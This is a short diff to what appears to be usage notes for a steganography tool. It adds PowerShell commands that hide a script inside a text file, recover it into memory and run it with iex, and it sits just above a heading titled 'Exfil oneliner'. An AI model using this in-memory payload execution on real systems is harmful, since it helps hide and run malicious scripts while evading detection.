@@ -1,4 +1,21 @@
 ```
+#.\stego.exe -C -f .\test.ps1 -p "test" .\input.txt  out2.txt
+Compressed by 24.73%
+Message exceeded available space by approximately 31859.26%.
+An extra 292 lines were added.
+
+#Decrypt and store onmem + type cast as string: 
+$payload = .\stego.exe -C -p "test" .\out2.txt|Out-String
+
+#eval whole payload
+iex($payload)
+
+```
+
+
+
+
+```
 
 Exfil oneliner
 
